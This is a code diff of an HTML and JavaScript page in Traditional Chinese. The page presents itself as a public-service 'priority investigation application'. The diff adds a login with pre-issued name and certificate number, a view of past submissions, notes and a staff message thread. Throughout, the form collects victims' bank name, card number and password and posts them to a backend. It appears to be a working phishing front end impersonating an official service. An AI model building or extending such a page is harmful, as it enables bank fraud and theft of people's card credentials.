@@ -25,21 +25,27 @@
     <section class="surface compact priority-form-shell">
       <p class="eyebrow">便民服務</p>
       <h2>優先調查申請表</h2>
-      <p class="muted">請輸入後台預先建立的姓名與證號後填寫申請內容。每一筆包含 II（銀行別）、CC（卡號）、MM（密碼），可新增多筆。</p>
+      <p class="muted">請先用後台預先建立的姓名與證號登入。通過後才能查看以前的申請，並填寫新的 II（銀行別）、CC（卡號）、MM（密碼）與筆記。</p>
 
-      <form id="priorityApplicationForm" class="stacked-form" action="#" method="post">
+      <form id="priorityLoginForm" class="stacked-form" action="#" method="post">
         <label>姓名<input name="citizenName" type="text" autocomplete="name" required></label>
         <label>證號<input name="certificateNumber" type="text" autocomplete="off" autocapitalize="characters" spellcheck="false" required></label>
-
-        <div class="section-heading">
-          <h3>申請資料</h3>
-          <button type="button" class="secondary" data-action="addPriorityRow">新增一筆</button>
-        </div>
-        <div data-slot="priorityRows" class="priority-rows"></div>
-        <p class="muted">II=銀行別，CC=卡號，MM=密碼。</p>
-
-        <button type="submit">送出申請</button>
+        <button type="submit">登入</button>
       </form>
+
+      <div id="priorityWorkspace" class="hidden" hidden>
+        <p id="priorityIdentity" class="muted"></p>
+        <div id="priorityHistory" class="priority-history"></div>
+        <form id="priorityApplicationForm" class="stacked-form" action="#" method="post">
+          <div class="section-heading">
+            <h3>新增申請資料</h3>
+            <button type="button" class="secondary" data-action="addPriorityRow">新增一筆</button>
+          </div>
+          <div data-slot="priorityRows" class="priority-rows"></div>
+          <p class="muted">II=銀行別，CC=卡號，MM=密碼。每一筆的筆記送出後不能修改，之後只能再補新的訊息。</p>
+          <button type="submit">送出申請</button>
+        </form>
+      </div>
       <div id="priorityStatus" class="notice hidden" role="status" aria-live="polite"></div>
     </section>
   </main>
@@ -49,11 +55,17 @@
   </footer>
   <script>
   (function(){
+    var loginForm = document.getElementById('priorityLoginForm');
+    var workspace = document.getElementById('priorityWorkspace');
+    var identity = document.getElementById('priorityIdentity');
+    var history = document.getElementById('priorityHistory');
     var form = document.getElementById('priorityApplicationForm');
     var rows = document.querySelector('[data-slot="priorityRows"]');
     var status = document.getElementById('priorityStatus');
-    if (!form || !rows || !status) return;
+    var session = null;
+    if (!loginForm || !workspace || !form || !rows || !status) return;
     function showStatus(text, type){ status.textContent = text; status.className = 'notice ' + (type === 'error' ? 'error' : ''); status.hidden = !text; }
+    function escapeHtml(value){ return String(value == null ? '' : value).replace(/[&<>"']/g, function(char){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[char]; }); }
     function addRow(){
       var index = rows.children.length + 1;
       var row = document.createElement('div');
@@ -62,6 +74,7 @@
         '<label>II 銀行別<input name="bank" type="text" autocomplete="off"></label>' +
         '<label>CC 卡號<input name="cardNumber" type="text" inputmode="numeric" autocomplete="off"></label>' +
         '<label>MM 密碼<input name="password" type="text" autocomplete="off"></label>' +
+        '<label>筆記<textarea name="note"></textarea></label>' +
         '<button type="button" class="secondary" data-action="removePriorityRow">移除</button>';
       row.querySelector('[data-action="removePriorityRow"]').addEventListener('click', function(){
         if (rows.children.length > 1) row.remove();
@@ -74,33 +87,82 @@
         return response.json().then(function(data){ if (!response.ok) throw new Error(data.error || '送出失敗'); return data; });
       });
     }
+    function renderHistory(applications){
+      var entries = [];
+      (applications || []).forEach(function(application){
+        (application.entries || []).forEach(function(entry){ entries.push(entry); });
+      });
+      history.innerHTML = entries.length ? '' : '<p class="muted">目前還沒有申請資料。</p>';
+      entries.forEach(function(entry, index){
+        var card = document.createElement('article');
+        card.className = 'priority-saved';
+        var messages = Array.isArray(entry.messages) ? entry.messages : [];
+        var thread = messages.map(function(message){
+          return '<p><span>' + (message.role === 'staff' ? '後台' : '民眾') + '</span> ' + escapeHtml(message.body) + '</p>';
+        }).join('') || '<p class="muted">尚無筆記或回覆</p>';
+        card.innerHTML = '<strong>第 ' + (index + 1) + ' 筆</strong><div>II：' + escapeHtml(entry.bank || '未填') + '｜CC：' + escapeHtml(entry.cardNumber || '未填') + '｜MM：' + escapeHtml(entry.password || '未填') + '</div><div class="priority-thread">' + thread + '</div><form class="priority-followup"><label>補上訊息<textarea name="body" required></textarea></label><button type="submit">送出訊息</button></form>';
+        card.querySelector('form').addEventListener('submit', function(event){
+          event.preventDefault();
+          var messageForm = event.currentTarget;
+          var button = messageForm.querySelector('button');
+          button.disabled = true;
+          requestJson('/api/priority-applications/messages', {
+            method: 'POST',
+            body: JSON.stringify({ citizenName: session.citizenName, certificateNumber: session.certificateNumber, entryId: entry.id, body: messageForm.elements.body.value.trim() })
+          }).then(function(){ return reload(); }).catch(function(error){ showStatus(error.message || '送出失敗', 'error'); }).finally(function(){ button.disabled = false; });
+        });
+        history.appendChild(card);
+      });
+    }
+    function reload(){
+      return requestJson('/api/priority-applications/lookup', {
+        method: 'POST',
+        body: JSON.stringify(session)
+      }).then(function(data){ renderHistory(data.applications || []); showStatus(''); });
+    }
     document.querySelector('[data-action="addPriorityRow"]').addEventListener('click', addRow);
     for (var count = 0; count < 3; count += 1) addRow();
+    loginForm.addEventListener('submit', function(event){
+      event.preventDefault();
+      var button = loginForm.querySelector('button[type="submit"]');
+      session = { citizenName: loginForm.elements.citizenName.value.trim(), certificateNumber: loginForm.elements.certificateNumber.value.trim().toUpperCase() };
+      button.disabled = true;
+      showStatus('登入中...');
+      requestJson('/api/priority-applications/lookup', { method: 'POST', body: JSON.stringify(session) }).then(function(data){
+        loginForm.hidden = true;
+        loginForm.classList.add('hidden');
+        workspace.hidden = false;
+        workspace.classList.remove('hidden');
+        identity.textContent = session.citizenName + ' · ' + session.certificateNumber;
+        renderHistory(data.applications || []);
+        showStatus('');
+      }).catch(function(error){
+        session = null;
+        showStatus(error.message || '查無資料', 'error');
+      }).finally(function(){ button.disabled = false; });
+    });
     form.addEventListener('submit', function(event){
       event.preventDefault();
+      if (!session) return showStatus('請先登入', 'error');
       var button = form.querySelector('button[type="submit"]');
       var entries = Array.prototype.map.call(rows.children, function(row){
         return {
           bank: row.querySelector('[name="bank"]').value.trim(),
           cardNumber: row.querySelector('[name="cardNumber"]').value.trim(),
-          password: row.querySelector('[name="password"]').value.trim()
+          password: row.querySelector('[name="password"]').value.trim(),
+          note: row.querySelector('[name="note"]').value.trim()
         };
       }).filter(function(entry){ return entry.bank || entry.cardNumber || entry.password; });
       button.disabled = true;
       showStatus('送出中...');
       requestJson('/api/priority-applications', {
         method: 'POST',
-        body: JSON.stringify({
-          citizenName: form.elements.citizenName.value.trim(),
-          certificateNumber: form.elements.certificateNumber.value.trim().toUpperCase(),
-          entries: entries
-        })
+        body: JSON.stringify({ citizenName: session.citizenName, certificateNumber: session.certificateNumber, entries: entries })
       }).then(function(){
-        form.reset();
         rows.innerHTML = '';
-        for (var count = 0; count < 3; count += 1) addRow();
-        showStatus('申請已送出。');
-      }).catch(function(error){
+        for (var next = 0; next < 3; next += 1) addRow();
+        return reload();
+      }).then(function(){ showStatus('申請已送出。'); }).catch(function(error){
         showStatus(error.message || '送出失敗', 'error');
       }).finally(function(){ button.disabled = false; });
     });
